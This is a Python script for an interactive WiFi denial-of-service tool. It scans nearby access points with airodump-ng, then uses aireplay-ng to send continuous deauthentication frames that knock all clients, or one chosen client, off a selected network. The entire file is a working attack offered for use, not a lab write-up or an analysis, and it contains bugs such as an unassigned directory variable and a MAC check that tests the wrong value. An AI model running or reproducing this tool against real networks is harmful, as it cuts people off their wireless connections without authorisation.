try:
    import psutil, subprocess, os, sys, time, re, csv, shutil, curses
    from datetime import datetime
    from termcolor import colored

    def wifi_dos():
        nbr_csv = 0
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("\nBackup folder exists.")
        for file_name in os.listdir():
            if ".csv" in file_name:
                nbr_csv += 1
                directory = os.getcwd()
                shutil.move(file_name, directory + "/backup/" + file_name)
        if nbr_csv >= 1:
            print("There shouldn't be any .csv files in your directory. We found .csv files in your directory (moved to backup dir.).")
        addrs = psutil.net_if_addrs()
        interfaces = list(addrs.keys())
        interfaces.remove("lo")
        interfaces.remove("eth0")
        nbr_i = len(interfaces)
        print(colored("\nINTERFACES:\n", "red", attrs=['bold']))
        liste = 1
        index = 0
        for i in range(nbr_i):
            print(liste,")",interfaces[index])
            index += 1
            liste += 1
        while True:
            try:
                entry = int(input(colored("\nSelect the interface to use: ", "green")))
            except Exception:
                print(colored("Enter a valid input!", "red", attrs=["bold"]))
                continue
            except KeyboardInterrupt:
                print(colored("\n\nExiting...", "red", attrs=['bold']))
                exit()
            else:
                if entry <= nbr_i:
                    print("\r")
                    break
                else:
                    print(colored("Invalid interface", "red", attrs=['bold']))
                    continue

        def colored_text(message, color, font):
            for i in range(2):
                sys.stdout.write(colored("\r" + message + " - /", color, attrs=[font]))
                sys.stdout.flush()
                time.sleep(0.4)
                sys.stdout.write(colored("\r" + message + " - \\", color, attrs=[font]))
                sys.stdout.flush()
                time.sleep(0.4)
            sys.stdout.write(colored("\r" + message + " - done", "green", attrs=[font]))
        while True:
            try:
                kill_process = input(colored("Do you want to kill conflicting processes?", attrs=["bold"]) + colored(" y/n : ", "red", attrs=["bold"]))
            except KeyboardInterrupt:
                print(colored("\n\nExiting...", "red", attrs=['bold']))
                exit()
            else:
                if kill_process.lower() == "y" or kill_process.lower() == "n":
                    break
                else:
                    print(colored("Input \"y\" or \"n\"", "red", attrs=['bold']))
                    continue
        if  kill_process.lower() == "y":
            print("\r")
            colored_text("KILLING PROCESSES" , "red", "bold")
            try:
                subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
            except Exception:
                print("Error while killing conflicting processes")
                exit()
        print("\r")
        colored_text("ENABLING MONITOR MODE ON " + interfaces[entry - 1].upper() , "red", "bold")
        try:
            subprocess.run(["sudo", "airmon-ng", "start", interfaces[entry - 1]], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            print(colored("\n\nError while enabling monitor mode", "red", attrs=['bold']))
            exit()
            time.sleep(2)
        print("\r")
        colored_text("SEARCHING WIFI's" , "red", "bold")

        addrs = psutil.net_if_addrs()
        interfaces = list(addrs.keys())
        interfaces.remove("lo")
        interfaces.remove("eth0")
        for i in interfaces:
            if i.find("mon") != -1:
                interface = i
        discover_aps = subprocess.Popen(["sudo", "airodump-ng", interface, "--write", "Wifi-tb-scan-dump", "--output-format", "csv", "--write-interval", "1"], stdout=subprocess.DEVNULL , stderr=subprocess.DEVNULL)
        number = 0
        try:
            while True:
                subprocess.call("clear", shell = True)
                for file_name in os.listdir():
                    fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                    if ".csv" in file_name:
                        with open('Wifi-tb-scan-dump-01.csv') as csvfile:
                            csvfile.seek(0)
                            csv_reader = csv.DictReader(csvfile, fieldnames=fieldnames)
                            print(colored('\n\nPress ctrl + c when ready to make a choice\n', 'red', attrs=['bold']))
                            print("No |\tBSSID              |\tChannel|\tESSID                         |")
                            print("___|\t___________________|\t_______|\t______________________________|")
                            for row in csv_reader:
                                if row["BSSID"] == "BSSID":
                                    continue
                                elif row["BSSID"] == "Station MAC":
                                    break
                                number += 1
                                print(f"{number}\t{row['BSSID']}\t{row['channel'].strip()}\t\t{row['ESSID']}")
                    time.sleep(1)
                    number = 0
        except Exception:
            print(colored('\nError while searching access points', 'red', attrs=['bold']))

        except KeyboardInterrupt:
            print(colored('\nReady to make a choice', 'white', attrs=['bold']))
            time.sleep(1)
            while True:
                bssid = input(colored('\nBSSID: ', 'white', attrs=['bold']))
                if len(bssid) == 17 and bssid[2::3] == ':::::':
                        break
                else:
                    print(colored("Please input a valid BSSID", "red", attrs=['bold']))
                    pass

            while True:
                try:
                    channel = int(input(colored('\nCHANNEl: ', 'white', attrs=['bold'])))
                except:
                    print(colored("Please input a valid channel", "red", attrs=['bold']))
                    continue
                else:
                    break
            subprocess.run(["airmon-ng", "start", interface, str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            while True:
                attack_type = input(colored('\nDo you want to kick all clients from networks?', 'white', attrs=['bold']) + colored(' y or n: ', 'red', attrs=['bold']))
                if attack_type.lower() == "y" or attack_type.lower() == "n":
                    break
                else:
                    print(colored("Input \"y\" or \"n\"", "red", attrs=['bold']))
                    continue
            if  attack_type.lower() == "y":
                print(colored("\nDEAUTHING ALL CLIENTS!" , "red", attrs=["bold"]))
                print(colored("press ctrl+c to abort" , "white", attrs=["bold"]))
                subprocess.run(["sudo", "aireplay-ng", "-0", "0", "-a", bssid, interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif attack_type.lower() == "n":
                colored_text("SEARCHING CLIENTS" , "red", "bold")
                try:
                    print(colored('\nPress ctrl + c when ready to make a choice', 'red', attrs=['bold']))
                    discover_clients = subprocess.Popen(["sudo", "airodump-ng", interface, "--write", "Wifi-tb-client-dump", "--output-format", "csv", "--write-interval", "1", "--bssid", bssid, "--channel", str(channel)], stdout=subprocess.DEVNULL , stderr=subprocess.DEVNULL)
                    while True:
                        subprocess.call("clear", shell = True)
                        for file_name in os.listdir():
                            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                            if ".csv" in file_name:
                                with open('Wifi-tb-client-dump-01.csv') as csvfile:
                                    csvfile.seek(0)
                                    csv_reader = csv.DictReader(csvfile, fieldnames=fieldnames)
                                    print(colored('\n\nPress ctrl + c when ready to make a choice\n', 'red', attrs=['bold']))
                                    print("\tBSSID              |\tChannel|\tESSID                         |")
                                    print("\t___________________|\t_______|\t______________________________|")
                                    for row in csv_reader:
                                        if row["BSSID"] == "BSSID":
                                            continue
                                        elif row["BSSID"] == "Station MAC":
                                            print("\n\tClients              |")
                                            print("\t___________________")
                                            continue
                                        print(f"\t{row['BSSID']}\t{row['channel'].strip()}\t\t{row['ESSID']}")
                            time.sleep(1)
                except Exception:
                    print(colored('\nError while searching access points', 'red', attrs=['bold']))
                except KeyboardInterrupt:
                    print(colored('\nReady to make a choice', 'white', attrs=['bold']))
                    while True:
                        client_mac = input(colored('\nClient: ', 'white', attrs=['bold']))
                        if len(bssid) == 17 and bssid[2::3] == ':::::':
                                break
                        else:
                            print(colored("Please input a valid MAC adress", "red", attrs=['bold']))
                            pass
                    print(colored(f"\n\nDEAUTHING CLIENT! ({client_mac})" , "red", attrs=["bold"]))
                    print(colored("press ctrl+c to abort" , "white", attrs=["bold"]))
                    subprocess.run(["sudo", "aireplay-ng", "-0", "0", "-a", bssid, "-c", client_mac, interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("clear", shell = True)
    print(r"""

     /$$      /$$ /$$$$$$ /$$$$$$$$ /$$$$$$       /$$$$$$$$ /$$$$$$$
    | $$  /$ | $$|_  $$_/| $$_____/|_  $$_/      |__  $$__/| $$__  $$
    | $$ /$$$| $$  | $$  | $$        | $$           | $$   | $$  \ $$
    | $$/$$ $$ $$  | $$  | $$$$$     | $$           | $$   | $$$$$$$
    | $$$$_  $$$$  | $$  | $$__/     | $$           | $$   | $$__  $$
    | $$$/ \  $$$  | $$  | $$        | $$           | $$   | $$  \ $$
    | $$/   \  $$ /$$$$$$| $$       /$$$$$$         | $$   | $$$$$$$/
    |__/     \__/|______/|__/      |______/         |__/   |_______/
    """)
    print("*****************************")
    print('\nby Kookie\n')
    print('*****************************')
    def check_privileges():
        if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
            exit(colored("You need to run this script with sudo or as root.", "red", attrs=['bold']))
    check_privileges()

    print(colored("\n\n1) Wifi DOS\n", "white", attrs=["bold"]))
    while True:
        try:
            module = input(colored("\n99) Choose module > ", "red", attrs=["bold"]))
        except KeyboardInterrupt:
            print(colored("\n\nExiting...", "red", attrs=['bold']))
            exit()
        except:
            print(colored("Input a valid module", "white", attrs=["bold"]))
        if module == "1":
            wifi_dos()
        elif module != "1":
            print(colored("Input a valid module", "white", attrs=["bold"]))
except KeyboardInterrupt:
    print(colored("\n\nExiting...", "red", attrs=['bold']))
    exit()
